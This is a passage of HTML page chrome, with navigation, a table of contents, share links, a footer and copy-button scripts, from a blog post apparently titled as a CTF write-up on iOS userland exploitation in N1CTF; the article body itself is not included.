            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../index.html">Home</a>
        </span>
      </li><!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Writing</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../archives/">Writing</a>
        </span>
      </li><!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Projects</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../https:/github.com/KpwnZ">Projects</a>
        </span>
      </li>
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Script"><span class="toc-number">1.3.</span> <span class="toc-text">Script</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&text=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&is_video=false&description=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF&body=Check out this article: https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&title=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&name=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/&t=From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Xia0o0o0o
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a href="../../../../https:/github.com/KpwnZ">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="../../../../js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
